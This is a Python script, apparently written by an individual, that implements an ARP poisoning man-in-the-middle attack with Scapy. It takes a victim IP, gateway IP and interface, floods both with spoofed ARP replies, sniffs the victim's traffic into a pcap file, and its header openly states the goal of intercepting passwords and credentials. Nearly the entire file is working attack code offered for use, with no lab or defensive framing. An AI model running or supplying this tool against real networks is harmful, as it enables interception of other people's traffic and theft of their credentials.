#! /usr/bin/python
#################################################################################################
# Author: Nicholas Fisher
# Date: March 4th 2024
# Description of Script
# The provided Python script implements an ARP poisoning attack tool using Scapy. ARP poisoning 
# is a technique used to intercept traffic on a switched network. The script takes three 
# command-line arguments: the IP address of the victim machine, the IP address of the gateway 
# router, and the network interface to use. It then initiates an ARP poisoning attack by sending 
# spoofed ARP packets to the victim and the gateway, tricking them into sending their traffic 
# through the attacker's machine. The attacker can then sniff the traffic passing through 
# and potentially intercept sensitive information such as passwords or credentials. 
# Please use the script in the following syntax below
# python script.py <victim_ip> <gateway_ip> <interface>
#################################################################################################
# Import necessary modules
from multiprocessing import Process  # For creating separate processes
from scapy.all import (ARP, Ether, conf, send, sniff, srp, wrpcap)  # Scapy modules for packet manipulation
import sys  # For accessing command line arguments
import time  # For time-related functions

# Function to get MAC address of a given IP address
def get_mac(target_ip):
    # Craft an ARP request packet to get MAC address
    packet = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(op="who has", pdst=target_ip)
    # Send the packet and receive response
    resp, _ = srp(packet, timeout=2, retry=10, verbose=False)
    # Extract MAC address from response
    for _, r in resp:
        return r[Ether].src
    return None

# Class to perform ARP poisoning attack
class Arper:
    # Initialize the Arper class with victim IP, gateway IP, and interface
    def __init__(self, victim, gateway, interface):
        self.victim = victim
        self.victimmac = get_mac(victim)  # Get victim's MAC address
        self.gateway = gateway
        self.gatewaymac = get_mac(gateway)  # Get gateway's MAC address
        self.interface = interface
        conf.verb = 0  # Set Scapy verbosity to minimal
        # Print initialization information
        print(f'Initialized interface: {interface}')
        print(f'Gateway {gateway} is at {self.gatewaymac}')
        print(f'Victim {victim} is at {self.victimmac}')
        print('-' * 30)

    # Method to start ARP poisoning attack
    def run(self):
        # Start a separate process for ARP poisoning
        self.poison_thread = Process(target=self.poison)
        self.poison_thread.start()
        # Start a separate process for packet sniffing
        self.sniff_thread = Process(target=self.sniff)
        self.sniff_thread.start()

    # Method to perform ARP poisoning
    def poison(self):
        # Create ARP packets to poison victim and gateway
        poison_victim = ARP()
        poison_victim.op = 2
        poison_victim.psrc = self.gateway
        poison_victim.pdst = self.victim
        poison_victim.hwdst = self.victimmac
        # Print ARP poisoning details
        print(f'ARP Poison - Victim: {poison_victim.pdst} ({poison_victim.hwdst}) -> Gateway: {poison_victim.psrc}')
        poison_gateway = ARP()
        poison_gateway.op = 2
        poison_gateway.psrc = self.victim
        poison_gateway.pdst = self.gateway
        poison_gateway.hwdst = self.gatewaymac
        print(f'ARP Poison - Victim: {poison_gateway.psrc} ({poison_gateway.hwdst}) -> Gateway: {poison_gateway.pdst}')
        print('-' * 30)
        print('Beginning the ARP poison. [CTRL-C to stop.]')
        try:
            # Continuously send ARP packets to maintain ARP poisoning
            while True:
                send(poison_victim)
                send(poison_gateway)
                time.sleep(2)
        except KeyboardInterrupt:
            # If CTRL-C is pressed, restore ARP tables and exit
            self.restore()
            sys.exit()

    # Method to sniff packets
    def sniff(self):
        time.sleep(5)  # Wait for ARP poisoning to take effect
        print('Please enter sniff count: ')
        count = int(input())  # Get the number of packets to sniff
        print(f'Sniffing {count} packets!')
        bpf_filter = f'ip host {self.victim}'  # Filter packets for victim's IP
        packets = sniff(count=count, filter=bpf_filter, iface=self.interface)  # Sniff packets
        wrpcap('arper.pcap', packets)  # Write sniffed packets to a file
        print('Got the packets!')
        self.restore()  # Restore ARP tables
        self.poison_thread.terminate()  # Terminate ARP poisoning process
        print('Finished!')

    # Method to restore ARP tables
    def restore(self):
        print('Restoring ARP Tables...')
        # Send ARP packets to restore ARP tables
        send(ARP(op=2, psrc=self.gateway, hwsrc=get_mac(self.gateway), pdst=self.victim, hwdst='ff:ff:ff:ff:ff:ff'), count=5)
        send(ARP(op=2, psrc=self.victim, hwsrc=get_mac(self.victim), pdst=self.gateway, hwdst='ff:ff:ff:ff:ff:ff'), count=5)

# Main entry point of the script
if __name__ == '__main__':
    # Check if the correct number of command line arguments is provided
    if len(sys.argv) != 4:
        print('Usage: python script.py <victim_ip> <gateway_ip> <interface>')
        sys.exit(1)
    # Get victim IP, gateway IP, and interface from command line arguments
    victim, gateway, interface = sys.argv[1], sys.argv[2], sys.argv[3]
    # Create an instance of Arper class
    myarp = Arper(victim, gateway, interface)
    # Run the ARP poisoning attack
    myarp.run()
